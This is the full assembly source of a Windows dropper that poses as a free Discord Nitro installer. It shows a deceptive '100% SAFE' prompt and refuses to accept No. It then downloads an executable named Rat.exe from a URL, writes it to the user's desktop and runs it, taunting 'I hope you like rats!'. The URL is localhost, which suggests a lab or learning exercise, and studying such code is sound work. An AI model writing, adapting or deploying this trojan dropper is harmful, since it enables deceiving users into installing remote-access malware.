    ; Discord Nitro Free Installer

    .386                  ; minimum processor needed for 32 bit
    .model flat, stdcall  ; FLAT memory model & STDCALL calling
    option casemap :none  ; set code to case sensitive

    ; constants
    include \masm32\include\windows.inc   ; Windows constants and types (always first)
    include \masm32\include\user32.inc    ; User32.dll functions
    include \masm32\include\kernel32.inc  ; Kernel32.dll functions
    include \masm32\include\wininet.inc   ; Windows internet
    include \masm32\include\shlwapi.inc   ;
    include \masm32\include\shell32.inc   ;

    ; link libraries
    includelib \masm32\lib\user32.lib    
    includelib \masm32\lib\kernel32.lib 
    includelib \masm32\lib\wininet.lib  
    includelib \masm32\lib\shlwapi.lib  
    includelib \masm32\lib\shell32.lib  

    ; constants
    MSGBOX_YES  equ 6h    ; message box yes selected
    MSGBOX_NO   equ 7h    ; message box no selected

    STEP_CONN   equ 1     ; establish connection step
    STEP_URL    equ 2     ; connect to URL step
    STEP_FILE   equ 3     ; create local file step
    STEP_PROC   equ 4     ; create process step

    CHUNK_SIZE  equ 1024  ; file download chunk size in bytes

; =====================================================================================================

    .data

    ; for anyone that runs strings or disassembles this
    unauth         db "STOP! You are not authorized to read this! ",
                      "Stop reading this immediately. OR ELSE!!!", 0

    ; message box displayed when first launched
    mbPromptTitle  db "Free Discord Nitro 2024 v2.7 - Extended Edition+", 0
    mbPromptText   db "IMPORTANT NOTICE: This program is 100% SAFE and verified ",
                      "by top security professionals to be VIRUS FREE.          ",
                      "                                                         ",
                      "                                                         ",
                      "Please confirm that you completely trust this program and",
                      " would like to proceed with secure and easy installation.", 0

    ; message box after install
    mbInstallTitle db "Install successful >:)", 0
    mbInstallText  db "Install successful. I hope you like rats!", 0

    ; message box when error occurred
    mbErrTitle     db "Install failed", 0
    errFmtStr      db "Step %d failed. Error code: %d", 0
    errBuffer      db 256 dup (?)

    ; test with local web server in repo (python3 -m http.server)
    ; downloadUrl   db "http://localhost:8000/x64/Debug/Rat.exe", 0
    downloadUrl    db "http://localhost:8000/x64/Release/Rat.exe", 0
    fileName       db "\\test\\Rat.exe", 0
    
    hInternet      dd 0                    ; handle to internet connection
    hConnect       dd 0                    ; handle to opened URL
    hFileLocal     dd 0                    ; handle to local file

    fileBuffer     db CHUNK_SIZE dup(?)    ; buffer for downloaded file
    downloadBytes  dd 0                    ; bytes downloaded
    desktopPath    db MAX_PATH dup(?)      ; path to desktop, used as full path desktop/file

    startInfo      STARTUPINFO <>          ; startup info struct
    procInfo       PROCESS_INFORMATION <>  ; process info struct

; =====================================================================================================

    .code

start:
    call main                ; call main function
    invoke ExitProcess, eax  ; exit program with status code

main proc

    ; init startup info struct
    invoke GetStartupInfo, addr startInfo

  prompt:
    ; display prompt messagebox
    invoke MessageBoxA, 0, offset mbPromptText, offset mbPromptTitle, (MB_ICONQUESTION or MB_YESNO)

    ; if no, ask again
    .if eax != MSGBOX_YES                                    
      jmp prompt 
    .endif

    ; get path to current user's desktop
    invoke SHGetFolderPath, 0, CSIDL_DESKTOPDIRECTORY, 0, 0, addr desktopPath

    ; check if path retrieved successfully
    .if eax != S_OK                                          
      jmp display_err
    .endif

    ; append filename to desktop path
    invoke lstrcat, addr desktopPath, addr fileName        

    ; open connection
    invoke InternetOpen, addr downloadUrl, INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0
    mov hInternet, eax

    ; check if connection failed
    .if eax == 0
      mov ecx, STEP_CONN
      jmp display_err
    .endif

    ; open download URL
    invoke InternetOpenUrl, hInternet, addr downloadUrl, 0, 0, INTERNET_FLAG_RELOAD, 0
    mov hConnect, eax
    
    ; check if URL open failed
    .if eax == 0
      mov ecx, STEP_URL
      jmp display_err
    .endif

    ; create file at path
    invoke CreateFile, addr desktopPath, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0
    mov hFileLocal, eax
    
    ; check if file create successful
    .if eax == INVALID_HANDLE_VALUE
      mov ecx, STEP_FILE
      jmp display_err
    .endif

  download_file:

    ; download file chunk
    invoke InternetReadFile, hConnect, addr fileBuffer, CHUNK_SIZE, addr downloadBytes

    ; check if file done downloading
    .if downloadBytes == 0 || eax == 0
      jmp download_done
    .endif

    ; write chunk to file
    invoke WriteFile, hFileLocal, addr fileBuffer, downloadBytes, addr downloadBytes, 0
    jmp download_file

  download_done:

    ; close handles
    invoke InternetCloseHandle, hConnect
    invoke InternetCloseHandle, hInternet
    invoke CloseHandle, hFileLocal

    ; display download success message
    invoke MessageBox, 0, addr mbInstallText, addr mbInstallTitle, MB_OK

    ; start new process for downloaded file
    invoke CreateProcess, addr desktopPath, 0, 0, 0, FALSE, 0, 0, 0, addr startInfo, addr procInfo

    ; check if process create failed
    .if eax == 0
      mov ecx, STEP_CONN
      jmp display_err
    .endif

    ; wait for the process to complete
    invoke WaitForSingleObject, procInfo.hProcess, INFINITE

    ; close process and thread handles
    invoke CloseHandle, procInfo.hProcess
    invoke CloseHandle, procInfo.hThread

    mov eax, 0  ; set status code, all is good
    jmp done    ; leave

  display_err:
    push eax    ; save status code
    invoke wsprintf, addr errBuffer, addr errFmtStr, ecx, eax
    invoke MessageBox, 0, addr errBuffer, addr mbErrTitle, (MB_OK or MB_ICONERROR)
    pop eax     ; restore status code

  done:
    ret

main endp

; =====================================================================================================

end start
